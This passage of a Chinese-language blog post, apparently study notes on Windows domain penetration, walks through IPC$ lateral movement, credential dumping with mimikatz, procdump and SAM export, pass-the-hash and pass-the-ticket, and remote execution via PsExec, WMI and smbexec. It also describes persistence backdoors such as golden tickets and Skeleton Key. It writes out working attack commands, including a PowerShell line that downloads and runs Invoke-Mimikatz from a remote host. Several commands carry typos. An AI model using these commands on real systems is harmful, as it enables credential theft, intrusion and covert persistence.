+<p><code>ipc$</code><strong>利用条件</strong></p>
+<ul>
+<li><p>开启了139、445端口</p>
+</li>
+<li><p>管理员开启了默认共享</p>
+<p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘（c$ d$ e$）和系统目录winnt或windows（admin$），通过<code>ipc$</code>，可以实现对这些默认共享目录的访问</p>
+</li>
+</ul>
+<p><code>ipc$</code><strong>连接失败的原因</strong></p>
+<ul>
+<li>用户名和密码错误</li>
+<li>没有打开<code>ipc$</code>默认共享</li>
+<li>不能成功连接目标的139和445端口</li>
+<li>命令输入错误</li>
+</ul>
+<p><strong>常见的错误号</strong></p>
+<ul>
+<li>错误号 5：拒绝访问</li>
+<li>错误号51：无法找到网络路径，网络中存在问题</li>
+<li>错误号53：找不到网络路径，包括IP地址错误，目标未开机，目标的<code>lanmanserver</code>服务未启动，目标有防护墙（端口过滤）</li>
+<li>错误号67：找不到网络名，包括<code>lanmanserver</code>服务未启动，<code>ipc$</code>已被删除</li>
+<li>错误号1219：提供的凭据与已存在的凭据集冲突，例如已经和目标建立<code>ipc$</code>，需要在错误原链接后重新进行连接</li>
+<li>错误号1326：未知的用户名和密码</li>
+<li>错误号1792：试图登录，但是网络登录服务没有启动</li>
+<li>错误号2242：用户密码已经过期</li>
+</ul>
+<p><strong>windows自带工具获取远程主机信息</strong></p>
+<ol>
+<li><p><code>dir</code>命令</p>
+<p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>dir</code>列出远程主机的文件</p>
+</li>
+<li><p><code>tasklist</code></p>
+<p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>tasklist</code>命令的<code>/S /U /P</code>参数列出远程主机上运行的进程</p>
+</li>
+</ol>
+<p><strong>计划任务</strong></p>
+<ol>
+<li><p><code>at</code>命令</p>
+<blockquote>
+<p>at 是windows自带的创建计划任务的命令，主要工作在Windows server 2008 之前的版本</p>
+</blockquote>
+<p>使用<code>at</code>命令在远程目标机器上面创建计划任务流程</p>
+<ol>
+<li><p>使用<code>net time</code>命令确定远程机器当前的系统时间</p>
+<p><code>net time \\192.168.1.17</code></p>
+</li>
+<li><p>将文件复制到目标系统</p>
+<p><code>copy calc.bat \\192.168.1.17\C$</code></p>
+</li>
+<li><p>使用<code>at</code>创建计划任务</p>
+<p><code>at \\192.168.1.17 4:11PM C:\cacl.bat</code></p>
+<p>创建一个计划任务，内容是下午4：11运行C盘 下的<code>cacl.bat</code></p>
+</li>
+<li><p>清楚<code>at</code>记录</p>
+<p><code>at \\192.168.1.17 jobID /delete</code></p>
+</li>
+</ol>
+</li>
+<li><p><code>schtasks</code>命令</p>
+<blockquote>
+<p>Windows Vist、Windows Server  2008及之后的版本将at命令废弃了，攻击者就用schtasks命令代替</p>
+</blockquote>
+<p>在远程主机上创建一个名称为<code>test</code>的计划任务，该任务在开机时启动C盘下的<code>cacl.bat</code>权限为system</p>
+<p><code>schtasks /create /s 192.168.1.17 /tn teat /sc onstart /tr c:\cacl.bat /ru system /f</code></p>
+<p>在远程主机上运行计划任务<code>test</code></p>
+<p><code>schtasks /run /s 192.168.1.17 /i /tn &quot;test&quot;</code></p>
+<blockquote>
+<p>在使用schtasks命令的时候不用输入密码，因为之前与目标 机器已经建立了ipc$连接，如果没有建立连接可以在执行的时候自己添加/u /p参数</p>
+</blockquote>
+<p>删除计划任务</p>
+<p><code>schtasks /delete /s 192.168.1.17 /tn &quot;test&quot; /f</code></p>
+<blockquote>
+<p>schtasks命令执行后会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt，如果执行命令后没有回显可以配合ipc$执行文件，使用type命令远程查看执行结果</p>
+</blockquote>
+<p>删除<code>ipc$</code></p>
+<p><code>net use 名称 /del /y</code></p>
+</li>
+</ol>
+<h5 id="散列值获取分析"><a href="#散列值获取分析" class="headerlink" title="散列值获取分析"></a>散列值获取分析</h5><p><strong>LM Hash 和 NTLM Hash</strong></p>
+<p>windows通常使用两种方法对用户的密码进行加密处理，域环境中用户的信息 存储在<code>ntds.dit</code>中，加密后为散列值，从Windows Vista 和Windows Server 2008版本开始，Windows 就默认禁用了LM Hash。NTLM Hash是微软为了提高安全性的同时保证兼容性而设计的散列加密算法，NTLM Hash是基于MD4 加密算法加密的。</p>
+<p><strong>单机密码抓取与防范</strong></p>
+<blockquote>
+<p>想要在Windows中抓取散列值和明文密码，必须将权限提升到System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。lsass.exe 进程用户Windows的安全策略（本地安全策略和登录策略）。</p>
+<p>SAM文件保存的位置 在C:\Windows\System32\config中</p>
+</blockquote>
+<p>下面是常见的单机密码抓取工具</p>
+<ol>
+<li><p><code>GetPass</code></p>
+<p>直接运行即可获取密码</p>
+</li>
+<li><p><code>PwDump7</code></p>
+<p>直接运行即可</p>
+</li>
+<li><p><code>QuarksPwDump</code></p>
+<p>运行<code>QuarksPwDump.exe --dump-hash-local</code>就可以导出用户的NTLM Hash</p>
+<p>它已经被大多数杀软标记为恶意软件</p>
+</li>
+<li><p>通过SAM和System文件抓取密码</p>
+<ol>
+<li><p>到处SAM文件和System文件</p>
+<p><code>reg save hklm\sam sam.hive</code></p>
+<p><code>reg save hklm\system system.hive</code></p>
+</li>
+<li><p>读取文件获得NTLM Hash</p>
+<ul>
+<li><p>使用<code>mimikatz</code>读取文件</p>
+<blockquote>
+<p>mimikatz是由法国的技术高手使用c语言写的系统调试工具，可以从内存中提取明文密码、散列值、PIN和Kerberos票据，它也可以执行哈希传递，票据传递或者构建黄金票据</p>
+</blockquote>
+<p>将<code>sam.hive</code> <code>system.hive</code>文件放到mimikatz的同一个目录下面</p>
+<p><code>lsadump::sam/sam:sam.hive /system:system.hive</code></p>
+</li>
+<li><p>使用Cain读取</p>
+</li>
+<li><p>使用<code>mimikatz</code>直接读取</p>
+<blockquote>
+<p>直接在目标机器上面运行</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug 提升权限<br>token::elevate 将权限提升到system<br>lsadump::sam 读取本地的SAM文件，获取NTLM Hash<br></code></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol start="5">
+<li><p><code>mimikatz</code>在线读取SAM</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
+</li>
+<li><p><code>mimikatz</code>离线读取<code>lsass.dmp</code>文件</p>
+<ol>
+<li><p>导出<code>lsass.dmp</code>文件</p>
+<ul>
+<li><p>使用任务管理器导出</p>
+<p>在任务管理器中找到<code>lsass.dmp</code>文件，右键选择”Create Dump File”</p>
+</li>
+<li><p>使用<code>procdump</code>导出</p>
+<blockquote>
+<p>这个是微软发布的工具所以不会被杀软查杀</p>
+</blockquote>
+<p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code> </p>
+</li>
+</ul>
+</li>
+<li><p>使用<code>mimikatz</code>获取</p>
+<p>先在命令环境运行<code>mimikatz</code>，将<code>lsass.dmp</code>文件加载到<code>mimikatz</code>当中，输入命令<code>sekurlsa::minidump lsass.DMP</code>，如果显示<code>Switch to MINIDUMP</code>就表示成功，最后输入<code>sekurlsa::logonPasswords full</code> 命令导出散列值</p>
+</li>
+</ol>
+</li>
+<li><p>使用<code>Powershell</code>对散列值进行Dump操作</p>
+<p>进入Nishang目录，将Get-PassHashes.ps1脚本导入</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-M,odule .\<span class="hljs-keyword">Get</span>-PassHashes.ps1<br><span class="hljs-keyword">Get</span>-PassHashes<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>Powershell</code>远程加载<code>mimikatz</code></p>
+<p><code>powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/176796.html">九种姿势运行Mimikatz </a></p>
+</li>
+</ol>
+<p><strong>使用Hashcat获取密码</strong></p>
+<p>这是一个密码破解软件，kali自带了，具体使用可以查看它提供的帮助</p>
+<h5 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击(PTH)"></a>哈希传递攻击(PTH)</h5><p>如果计算机本地管理员账户和密码也是相同的，攻击者就可以利用哈希传递攻击的方法登录内网中的其他计算机</p>
+<p><strong>使用NTLM Hash进行哈希传递</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">ntlm:</span>NTLM Hash<br></code></pre></td></tr></table></figure>
+
+<p>列出远程主机C盘的内容</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">dir <span class="hljs-tag">\<span class="hljs-name">\</span></span>主机名<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>使用AES-256密钥进行哈希传递</strong></p>
+<blockquote>
+<p>远程系统必须安装 KB2871997</p>
+</blockquote>
+<p>使用<code>mimikatz</code>抓取密钥</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::ekeys</span><br></code></pre></td></tr></table></figure>
+
+<p>以管理员命令运行<code>mimikatz</code></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">aes256:</span>AES<span class="hljs-number">-256</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>注意</strong></p>
+<ol>
+<li><code>dir</code>后面要使用主机名，而不是IP</li>
+<li>AES-128密钥也可以用来Hash传递</li>
+<li>使用AES密钥对远程主机进行哈希传递的前提是安装KB2871997</li>
+<li>安装了KB2871997后仍然可以使用SID为500的用户的NTLM Hash进行哈希传递</li>
+<li>要使用<code>mimikatz</code>的哈希传递功能，需要具有本地管理员的权限</li>
+</ol>
+<blockquote>
+<p>KB2871997通过禁止本地管理员权限与远程计算机进行连接，无法通过本地管理员权限对远程计算机使用PsExec，WMI，smbexec，schtasks，at，也无法访问远程主机的文件共享。但是对于Administrator（SID为500）的账户依然可以进行哈希传递</p>
+</blockquote>
+<h5 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h5><ol>
+<li><p>使用<code>mimikatz</code>进行票据传递</p>
+<p>导出内存中的票据</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz.exe<br>privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>执行命令后，会在当前目录中出现多个服务的票据文件<br><br>kerberos::purge  清除内存中的票据<br><br>kerberos::ptt PATH  注入票据<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>kekeo</code>进行票据传递</p>
+<p>工具下载：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<p><code>kekeo</code>需要域名，用户名，NTLM Hash三者配合生成票据，再将票据导入</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less">生成票据<br><span class="hljs-selector-tag">kekeo</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:lcdm123.com</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:NTLM</span> <span class="hljs-selector-tag">Hash</span><br>清除票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::purge</span> # <span class="hljs-selector-tag">kekeo</span>的命令<br><span class="hljs-selector-tag">klist</span> <span class="hljs-selector-tag">purge</span> # <span class="hljs-selector-tag">Windows</span>自带的命令<br>导入票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::ptt</span> <span class="hljs-selector-tag">PATH</span><br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><strong>注意</strong></p>
+<ul>
+<li>票据文件注入内存的默认有效时间是10小时</li>
+<li>在目标机器上不需要本地管理员权限就可以进行票据传递</li>
+</ul>
+<h5 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h5><p><code>PsExec</code>运行的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为<code>PSEXECSVC</code>的二进制文件，然后通过<code>psexec</code>服务运行命令，运行结束后删除服务</p>
+<ol>
+<li><p>已经建立了<code>ipc$</code></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">PsExec</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.17</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">-accepteula</span> 使用该参数就不会弹出确认框<br><span class="hljs-selector-tag">-s</span> 以<span class="hljs-selector-tag">System</span>权限获取交互式的<span class="hljs-selector-tag">shell</span>，如果不加就会获得一个<span class="hljs-selector-tag">Administrator</span>的<span class="hljs-selector-tag">shell</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>未建立<code>ipc$</code></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe<br><br>PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span> 执行命令<br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><strong>注意</strong></p>
+<ul>
+<li>远程系统默认开启<code>admin$</code>共享（默认是开启的）</li>
+<li>使用过程中会留下大量日志需要注意</li>
+<li>MSF也有PsExec的相应模块提供使用</li>
+</ul>
+<h5 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h5><p><code>WMI(Windows Management Instrumentation)</code>，它是由一系列工具集组成的，可以从本地或者远程管理计算机系统，从Windows 98开始，windows操作系统都支持WMI。WMI的操作默认不会产生日志。</p>
+<p><strong>基本命令</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic /node:192.168.1.17 /user:administrator /password:PassWord process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span>  将执行结果保存在C盘中<br><br>type \\192.168.1.17\C$\ip.txt  建立ipc$后，使用type命令读取结果<br></code></pre></td></tr></table></figure>
+
+<p>wmic执行远程命令，在远程系统中启动WMI服务（服务端口为135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标系统有防火墙就无法连接，wmic就无法连接，wmic命令没有回显，需要使用<code>ipc$</code>和type命令来读取信息，如果wmic执行的是恶意程序也不会留下日志。</p>
+<p><strong>impacket工具包中的wmiexecc</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmiexec.py administrator:<span class="hljs-symbol">Password@</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br></code></pre></td></tr></table></figure>
+
+<p>主要用于Linux相关</p>
+<p><strong>wmiexec.vbs</strong></p>
+<p><code>wmiexec.vbs</code>脚本是通过VBS调用WMI来模拟PsExec的功能，可以在远程系统中执行命令并进行回显，获得半交互式shell</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">cscript.exe</span> <span class="hljs-string">//nologo</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/shell</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-comment"># 建立半交互式shell</span><br><span class="hljs-string">cscript.exe</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/cmd</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment"># 执行单条命令</span><br></code></pre></td></tr></table></figure>
+
+<p>对于一些运行时间较长的命令，需要添加<code>-wait 5000</code> 或者更长的时间参数；在运行nc这种不需要输出结果但是需要一直运行的命令时，使用<code>-persist</code>参数，就不需要使用<code>taskkill</code>命令来远程结束进程</p>
+<blockquote>
+<p>已经被许多杀软列入黑名单</p>
+</blockquote>
+<p><strong>Invoke-WmiCommand</strong></p>
+<p><code>Invoke-WmiCommand.ps1</code>脚本包含在<code>PowerSploit</code>工具包中，它通过<code>Powershell</code>调用WMI来远程执行命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 目标系统用户名</span><br>$User=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br>$Password= ConvertTo-SecureString -<span class="hljs-keyword">String</span> <span class="hljs-string">&quot;Password&quot;</span> -AsPlainText -Force<br><span class="hljs-comment"># 将账号和密码整合起来</span><br>$Cred= <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br><span class="hljs-comment"># 远程执行命令</span><br>$Remote=Invoke-WmiComand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br><span class="hljs-comment"># 将执行结果输出到屏幕</span><br>$Remote.PayloadOutput<br></code></pre></td></tr></table></figure>
+
+<p><strong>Invoke-WMIMethod</strong></p>
+<p>利用<code>Powershell</code>自带的<code>Invoke-WMIMethod</code>可以在远程执行命令和指定程序，在Powershell命令行环境中执行如下命令，可以以非交互式的方法执行命令，但是不会回显结果</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 目标系统用户名</span><br><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br><span class="hljs-variable">$Password</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># 将账号和密码整合起来</span><br><span class="hljs-variable">$Cred</span>= <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><span class="hljs-comment"># 在远程系统中运行计算机程序</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-literal">-Class</span> Win32_Process <span class="hljs-literal">-Name</span> Create <span class="hljs-literal">-ArgumenList</span> <span class="hljs-string">&quot;cacl.exe&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.1.17&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h5><blockquote>
+<p>使用smbexec时目标系统的共享必须开放（C$  ipc$ admin$）</p>
+</blockquote>
+<p><strong>C++版的smbexec</strong></p>
+<p>test.exe 客户端主程序</p>
+<p>execserver.exe 目标系统中的辅助程序</p>
+<p>常用命令<code>test.exe ip username password  command netshare</code></p>
+<p>使用</p>
+<ul>
+<li><p>将exeserver.exe上传到目标系统的C:\Windows目录下，解除UAC对命令执行的限制</p>
+<p><code>net use \\192.168.1.17 &quot;Password&quot; /user:lcdm123\administrator</code></p>
+</li>
+<li><p>在客户端执行</p>
+<p><code>test.exe 192.168.1.17 administrator Password whoami c$</code></p>
+</li>
+</ul>
+<p><strong>impacket工具包中的smbexec.py</strong></p>
+<p><code>smbexec.py lcdm123/administrator:password@192.168.1.17</code></p>
+<p><strong>DCOM在远程系统中的使用</strong></p>
+<blockquote>
+<p>DCOM（分布式组件对象模型）时微软的一系列概念和程序接口，通过DCOM客户端程序对象能够向网络中的另一台计算机上的服务程序对象发送请求</p>
+<p>DCOM是基于组件对象模型（COM）的，COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口</p>
+</blockquote>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h5><ul>
+<li><p>粘滞建后门</p>
+<p>使用后门程序替换<code>windows\system32</code>下的<code>sethc.exe</code>文件</p>
+</li>
+<li><p>注册表后门</p>
+<p>在普通用户权限下，攻击者将需要执行的后门程序或者而脚本路径填写到注册表键<code>HACK:Software\Microsoft\Windows\CurrentVersion\Run</code>中（键名任意）</p>
+</li>
+<li><p>计划任务后门</p>
+<ul>
+<li>MSF中模拟计划任务后门</li>
+<li>PowerShell中模拟计划任务后门</li>
+<li>Empire中模拟计划任务后门</li>
+</ul>
+</li>
+<li><p>meterpreter后门</p>
+<p>persistence是meterpreter自带的后门程序，是一个使用安装自启动方式的持久性后门程序</p>
+</li>
+<li><p>Cymothoa后门</p>
+<p>Cymothoa是一款可以将shellcode注入先后进程（插进程）的后门工具</p>
+</li>
+<li><p>WMI型后门</p>
+<p>WMI型后门只能由具有管理员权限的用户运行，WMI型后门通常是由Powershell编写的，可以直接从新的WMI属性中读取和执行后门代码，给代码加密，通过这种方法，攻击者可以在系统中安装一个具有持久性的后门并且不会再系统磁盘中留下任何文件</p>
+<p>WMI型后门使用了WMI的两个特征：无文件和无进程，基本原理是将代码加密存储再WMI中，达到所谓的无文件；当设定的条件被满足时系统将启动Powershell进程去执行后门程序，执行后进程将消失（时间根据后门的运行情况而定）达到所谓的无进程</p>
+</li>
+</ul>
+<h5 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h5><blockquote>
+<p>这个感觉就是比平时一句话木马差不多的后门</p>
+</blockquote>
+<ul>
+<li>Nishang下的webshell</li>
+<li>weevely后门</li>
+<li>webacoo后门</li>
+<li>MSF中的ASPX，PHP后门</li>
+<li>………………</li>
+</ul>
+<h5 id="域控制器权限持久化"><a href="#域控制器权限持久化" class="headerlink" title="域控制器权限持久化"></a>域控制器权限持久化</h5><ul>
+<li><p>DSRM域后门</p>
+<p>DSRM（目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（DSRM账户）</p>
+<p>DSRM的用途：允许管理员再域环境中出现故障或崩溃时还原，修复，重建活动目录数据库</p>
+<p>渗透测试中可以使用DSRM账户对域环境进行持久化操作，如果域控版本为win server 2008 需要安装KB961320才可以使用指定域账户的密码对DSRM进行同步，再之后的版本不需要安装，如果是Windows server 2003则不能使用这个方法进行持久化</p>
+</li>
+<li><p>SSP维持域控权限</p>
+<p>简单SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能，例如NTLM，kerberos等</p>
+<p>SSPI（安全支持提供程序接口）是windows操作系统在执行操作时使用的API接口，可以说SSPI是SSP的API接口</p>
+<p>SSP持久化操作的原理：LSA用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略，在启动时，SSP将被加载到lsass.exe进程中，但是假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就可以获得lsass.exe进程中的明文密码，这样即使用户更改密码并重新登录，攻击者依然能获取到明文密码。</p>
+</li>
+<li><p>SID History域后门</p>
+<p>每个用户都有自己的SID，SID的作用就是跟踪安全主体控制用户连接资源时的访问权限，SID History是域迁移过程中需要使用的一个属性。</p>
+<p><strong>SID History的作用就是在域迁移的过程中保持域用户的访问权限</strong>，即如果钱以后用户的SID改变了，系统将其原来的SID添加到钱以后用户的SID History中，使迁移后的用户保持原有的权限，能够访问原来可以访问的资源。</p>
+</li>
+<li><p>黄金票据</p>
+<p>假设域内存在一个SID为502的域账户为krbtgt，它是KDC服务使用的账户，属于Domain Admins组，域环境中，每个用户账户的票据都是由krbtgt生成的，如果拿到了krbtgt的NTLM Hash 或者 AES-256值就可以伪造域内任意用户的身份访问其他服务</p>
+<p>使用黄金票据进行票据传递攻击时需要的信息：</p>
+<ul>
+<li>完整的域名</li>
+<li>域SID</li>
+<li>krbtgt的NTLM Hash 或 AES-256值</li>
+<li>需要伪造的域管理员用户名</li>
+</ul>
+</li>
+<li><p>白银票据</p>
+<p>不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问服务的TGT，因为票据生成的过程中不会使用所以可以绕过域控，很少留下日志。白银票据依赖于服务账户的密码散列值，通过相应的服务账号来伪造TGS，例如 LDAP，MSSQL，DNS等，范围有限只能获取对应服务的权限。</p>
+<p>黄金票据是由krbtgt账号加密的，白银票据是由特定的服务账号加密的</p>
+<p>白银票据攻击时需要的信息：</p>
+<ul>
+<li>域名</li>
+<li>域SID</li>
+<li>目标服务器的FQDN</li>
+<li>可利用的服务</li>
+<li>服务账户的NTLM Hash</li>
+<li>需要伪造的用户名</li>
+</ul>
+</li>
+<li><p>Skeleton Key</p>
+<p>使用Skeleton Key （万能密码），可以对域内权限进行持久化操作，可以使用mimikatz和Emoire的操作将Skeleton Key注入lsass.exe中</p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网隧道搭建</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/12/Java%E5%8F%8D%E5%B0%84/">
+                        <span class="hidden-mobile">Java反射</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
